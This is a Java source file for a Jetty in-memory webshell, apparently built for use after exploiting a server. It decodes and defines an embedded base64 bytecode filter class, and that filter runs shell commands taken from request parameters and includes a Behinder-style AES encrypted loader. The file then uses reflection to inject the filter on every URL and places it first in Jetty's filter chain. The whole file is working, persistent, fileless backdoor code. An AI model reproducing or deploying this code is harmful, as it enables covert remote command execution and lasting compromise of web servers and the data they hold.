package com.javasec.memshell;

import sun.misc.BASE64Decoder;

import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

public class JettyFilterMemshell {
    private static Object servletHandler = null;
    private static String filterName = "FilterTemplate";
    private static String filterClassName = "com.javasec.memshell.FilterTemplate";
    private static String url = "/*";

    private static synchronized void LoadFilter() throws Exception {
        try{
            Thread.currentThread().getContextClassLoader().loadClass(filterClassName).newInstance();
        }catch (Exception e){
            Method a = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
            a.setAccessible(true);
            byte[] b = (new BASE64Decoder()).decodeBuffer("yv66vgAAADIBGwoAQwB7CQB8AH0IAH4KAH8AgAgAgQsAQACCCACDCgANAIQKAIUAhgoADQCHCQCIAIkIAIoHAIsIAIwIAI0IAF8IAI4HAI8KAJAAkQoAkACSCgCTAJQKABIAlQgAlgoAEgCXCgASAJgLAEEAmQoAmgCABwCbCgCFAJwLABwAnQsAHACeCACfCgCFAKALABwAoQgAogsAowCkCAClCgCmAKcHAKgHAKkKACgAewsAowCqCgAoAKsIAKwKACgArQoAKACuCgANAK8KACcAsAoApgCxBwCyCgAyAHsLAEAAswoAtAC1CgAyALYKAKYAtwcAuAoAQwC5CgA/ALoKADgAuwoAOAC8CgA/AL0IAL4HAL8HAMAHAMEKAD8AwgcAwwoAxADFBwDGCgBFAMcLAMgAyQcAygcAywEAAVUBAAxJbm5lckNsYXNzZXMBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAJkxjb20vYm9vZ2lwb3AvbWVtc2hlbGwvRmlsdGVyVGVtcGxhdGU7AQAEaW5pdAEAHyhMamF2YXgvc2VydmxldC9GaWx0ZXJDb25maWc7KVYBAAxmaWx0ZXJDb25maWcBABxMamF2YXgvc2VydmxldC9GaWx0ZXJDb25maWc7AQAKRXhjZXB0aW9ucwcAzAEACGRvRmlsdGVyAQBbKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjspVgEABGNtZHMBABNbTGphdmEvbGFuZy9TdHJpbmc7AQAGcmVzdWx0AQASTGphdmEvbGFuZy9TdHJpbmc7AQADY21kAQABawEABmNpcGhlcgEAFUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEADmV2aWxDbGFzc0J5dGVzAQACW0IBAAlldmlsQ2xhc3MBABFMamF2YS9sYW5nL0NsYXNzOwEACmV2aWxPYmplY3QBABJMamF2YS9sYW5nL09iamVjdDsBAAx0YXJnZXRNZXRob2QBABpMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAA5zZXJ2bGV0UmVxdWVzdAEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEAD3NlcnZsZXRSZXNwb25zZQEAH0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAAtmaWx0ZXJDaGFpbgEAG0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOwEADVN0YWNrTWFwVGFibGUHAIsHAFwHAMYHAM0BAAdkZXN0cm95AQAKU291cmNlRmlsZQEAE0ZpbHRlclRlbXBsYXRlLmphdmEMAEwATQcAzgwAzwDQAQAdWytdIER5bmFtaWMgRmlsdGVyIHNheXMgaGVsbG8HANEMANIA0wEABHR5cGUMANQA1QEABWJhc2ljDAC+ANYHANcMANgA2QwA2gDbBwDcDADdAF4BAAEvAQAQamF2YS9sYW5nL1N0cmluZwEABy9iaW4vc2gBAAItYwEAAi9DAQARamF2YS91dGlsL1NjYW5uZXIHAN4MAN8A4AwA4QDiBwDjDADkAOUMAEwA5gEAAlxBDADnAOgMAOkA2QwA6gDrBwDsAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAwA7QDZDADtANUMAO4A2QEABFBPU1QMAO8A2QwA8ADxAQABdQcA8gwA8wD0AQADQUVTBwD1DAD2APcBAB9qYXZheC9jcnlwdG8vc3BlYy9TZWNyZXRLZXlTcGVjAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIMAPgA+QwA+gD7AQAADAD6APwMAP0A2QwA/gD/DABMAQAMAFMBAQEAFnN1bi9taXNjL0JBU0U2NERlY29kZXIMAQIBAwcBBAwBBQDZDAEGAQcMAQgBCQEAJmNvbS9ib29naXBvcC9tZW1zaGVsbC9GaWx0ZXJUZW1wbGF0ZSRVDAEKAQsMAQwBDQwATAEODAEPARAMAREBEgEABmVxdWFscwEAD2phdmEvbGFuZy9DbGFzcwEAHGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3QBAB1qYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZQwBEwEUAQAQamF2YS9sYW5nL09iamVjdAcBFQwBFgEXAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwBGABNBwEZDABZARoBACRjb20vYm9vZ2lwb3AvbWVtc2hlbGwvRmlsdGVyVGVtcGxhdGUBABRqYXZheC9zZXJ2bGV0L0ZpbHRlcgEAHmphdmF4L3NlcnZsZXQvU2VydmxldEV4Y2VwdGlvbgEAE2phdmEvaW8vSU9FeGNlcHRpb24BABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAFShMamF2YS9sYW5nL09iamVjdDspWgEAHGNvbS9ib29naXBvcC9tZW1zaGVsbC9Db25maWcBAAtnZXRQYXNzd29yZAEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAHaXNFbXB0eQEAAygpWgEADGphdmEvaW8vRmlsZQEACXNlcGFyYXRvcgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAEbmV4dAEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQATamF2YS9pby9QcmludFdyaXRlcgEACWdldEhlYWRlcgEACWdldE1ldGhvZAEAFmdldEJlaGluZGVyU2hlbGxQd2RQd2QBAApnZXRTZXNzaW9uAQAiKClMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uOwEAHmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbgEADHNldEF0dHJpYnV0ZQEAJyhMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL09iamVjdDspVgEAE2phdmF4L2NyeXB0by9DaXBoZXIBAAtnZXRJbnN0YW5jZQEAKShMamF2YS9sYW5nL1N0cmluZzspTGphdmF4L2NyeXB0by9DaXBoZXI7AQAMZ2V0QXR0cmlidXRlAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEACGdldEJ5dGVzAQAEKClbQgEAFyhbQkxqYXZhL2xhbmcvU3RyaW5nOylWAQAXKElMamF2YS9zZWN1cml0eS9LZXk7KVYBAAlnZXRSZWFkZXIBABooKUxqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIBAAhyZWFkTGluZQEADGRlY29kZUJ1ZmZlcgEAFihMamF2YS9sYW5nL1N0cmluZzspW0IBAAdkb0ZpbmFsAQAGKFtCKVtCAQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQAOZ2V0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQBAKExjb20vYm9vZ2lwb3AvbWVtc2hlbGwvRmlsdGVyVGVtcGxhdGU7TGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgEAAWcBABUoW0IpTGphdmEvbGFuZy9DbGFzczsBAAtuZXdJbnN0YW5jZQEAFCgpTGphdmEvbGFuZy9PYmplY3Q7AQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAPcHJpbnRTdGFja1RyYWNlAQAZamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbgEAQChMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7KVYAIQBIAEMAAQBJAAAABAABAEwATQABAE4AAAAvAAEAAQAAAAUqtwABsQAAAAIATwAAAAYAAQAAAAwAUAAAAAwAAQAAAAUAUQBSAAAAAQBTAFQAAgBOAAAANQAAAAIAAAABsQAAAAIATwAAAAYAAQAAABAAUAAAABYAAgAAAAEAUQBSAAAAAAABAFUAVgABAFcAAAAEAAEAWAABAFkAWgACAE4AAALFAAcACgAAAYqyAAISA7YABCsSBbkABgIAxgCQKxIFuQAGAgASB7YACJkAgCu4AAm5AAYCADoEGQTGAG0ZBLYACpoAZQE6BbIACxIMtgAImQAbBr0ADVkDEg5TWQQSD1NZBRkEUzoFpwAYBr0ADVkDEhBTWQQSEVNZBRkEUzoFuwASWbgAExkFtgAUtgAVtwAWEhe2ABi2ABk6Biy5ABoBABkGtgAbpwDsK8AAHLgAHbkAHgIAxgDVK8AAHLkAHwEAEiC2AAiZALe4ACE6BCvAABy5ACIBABIjGQS5ACQDABIluAAmOgUZBQW7ACdZuwAoWbcAKSvAABy5ACIBABIjuQAqAgC2ACsSLLYALbYALrYALxIltwAwtgAxGQW7ADJZtwAzK7kANAEAtgA1tgA2tgA3Oga7ADhZKiq2ADm2ADq3ADsZBrYAPDoHGQe2AD06CBkHEj4FvQA/WQMSQFNZBBJBU7YAQjoJGQkZCAW9AENZAytTWQQsU7YARFenABU6BBkEtgBGpwALLSssuQBHAwCxAAEArwF0AXcARQADAE8AAABuABsAAAAUAAgAFgAjABgALgAZADsAGgA+ABsASQAcAGEAHgB2ACAAkgAhAJ0AIwCvACYAwAAnAMUAKADXACkA3gAqARIAKwEsACwBQgAtAUkALgFgAC8BdAAzAXcAMQF5ADIBfgAzAYEANQGJADcAUAAAAI4ADgA+AF8AWwBcAAUAkgALAF0AXgAGAC4AbwBfAF4ABADFAK8AYABeAAQA3gCWAGEAYgAFASwASABjAGQABgFCADIAZQBmAAcBSQArAGcAaAAIAWAAFABpAGoACQF5AAUAawBsAAQAAAGKAFEAUgAAAAABigBtAG4AAQAAAYoAbwBwAAIAAAGKAHEAcgADAHMAAAAZAAj9AGEHAHQHAHUU+QAmAvsA00IHAHYJBwBXAAAABgACAHcAWAABAHgATQABAE4AAAArAAAAAQAAAAGxAAAAAgBPAAAABgABAAAAPABQAAAADAABAAAAAQBRAFIAAAACAHkAAAACAHoASwAAAAoAAQA4AEgASgAA");
            a.invoke(Thread.currentThread().getContextClassLoader(), b, 0, b.length);
        }
    }

    //获取上下文
    public static synchronized void GetWebContent() throws Exception {
        try{
            Thread currentThread = Thread.currentThread();
            Object contextClassLoader = GetField(currentThread, "contextClassLoader");
            Object _context = GetField(contextClassLoader,"_context");
            servletHandler = GetField(_context,"_servletHandler");
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    private static synchronized void InjectFilter() throws Exception {
        if(servletHandler != null){
            //方法二
            Class HFilter = Thread.currentThread().getContextClassLoader().loadClass(filterClassName);
            Method addFilterWithMapping = GetMethod(servletHandler, "addFilterWithMapping", Class.class, String.class, Integer.TYPE);
            addFilterWithMapping.invoke(servletHandler, HFilter, "/*", 1);

            //使用addFilterWithMapping有个问题，动态添加FilterMapping时，其dispatches可能会与已加载到内存中的FilterMapping重复了，因此需要调整元素在_filterPathMappings中的位置
            Object filterMaps = GetField(servletHandler, "_filterMappings");
            Object[] tmpFilterMaps = new Object[Array.getLength(filterMaps)];
            int n = 1;
            int j;

            for(j = 0; j < Array.getLength(filterMaps); ++j) {
                Object filter = Array.get(filterMaps, j);
                String filterName = (String)GetField(filter, "_filterName");
                if (filterName.contains(HFilter.getName())) {
                    tmpFilterMaps[0] = filter;
                } else {
                    tmpFilterMaps[n] = filter;
                    ++n;
                }
            }
            for(j = 0; j < tmpFilterMaps.length; ++j) {
                Array.set(filterMaps, j, tmpFilterMaps[j]);
            }
        }

    }
    private static synchronized Object GetField(Object o, String k) throws Exception{
        Field f;
        try {
            f = o.getClass().getDeclaredField(k);
        } catch (NoSuchFieldException e) {
            try{
                f = o.getClass().getSuperclass().getDeclaredField(k);
            }catch (Exception e1){
                f = o.getClass().getSuperclass().getSuperclass().getDeclaredField(k);
            }
        }
        f.setAccessible(true);
        return f.get(o);
    }

    private static synchronized Method GetMethod(Object obj, String methodName, Class<?>... paramClazz) throws NoSuchMethodException {
        Method method = null;
        Class clazz = obj.getClass();

        while(clazz != Object.class) {
            try {
                method = clazz.getDeclaredMethod(methodName, paramClazz);
                break;
            } catch (NoSuchMethodException var6) {
                clazz = clazz.getSuperclass();
            }
        }

        if (method == null) {
            throw new NoSuchMethodException(methodName);
        } else {
            method.setAccessible(true);
            return method;
        }
    }


    public JettyFilterMemshell() {
        try{
            LoadFilter();
            GetWebContent();
            InjectFilter();
        }catch (Exception e){
            e.printStackTrace();
        }

    }

}
